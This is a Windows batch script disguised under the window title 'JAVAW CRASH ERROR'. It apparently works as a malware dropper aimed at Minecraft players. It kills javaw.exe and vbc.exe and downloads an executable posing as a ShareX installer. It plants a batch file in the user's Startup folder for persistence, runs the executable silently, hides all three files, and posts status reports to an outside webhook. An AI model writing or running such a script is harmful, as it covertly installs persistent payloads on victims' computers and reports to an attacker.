@echo off
SETLOCAL EnableExtensions
set EXE=vbc.exe
set vbc=vbc.exe
set minecraft=javaw.exe
title JAVAW CRASH ERROR
cd C:\Users\%username%\AppData\Local\Temp\screenshots\
mkdir ShareX
cd ShareX
curl -o ShareXInstaller.exe Link
cls
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
curl -o Startup.bat Link
cls
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %vbc%"') DO IF %%x == %vbc% goto killvbc
goto mine
:killvbc
cls
taskkill /f /im vbc.exe
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"vbc.exe has been terminated\"}" webhook
cls
goto mine
:mine
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %minecraft%"') DO IF %%x == %minecraft% goto kilmc
goto 2
:kilmc
taskkill /f /im javaw.exe
goto 2
:2
cls
start "" "C:\Users\%username%\AppData\Local\Temp\screenshots\ShareX\ShareXInstaller.exe" -i silent
cd C:\Users\%username%\AppData\Local\Temp\screenshots\
attrib +h screenshot.bat
cd C:\Users\%username%\AppData\Local\Temp\screenshots\ShareX\
attrib +h ShareXInstaller.exe
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
attrib +h Startup.bat
cls
ping localhost -n 2 >nul
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto ProcessFound
goto ProcessNotFound
:ProcessFound
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Process Active\"}" webhook
goto end
:ProcessNotFound
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Process Not Active\"}" webhook
goto end
:end
taskkill /f /im cmd.exe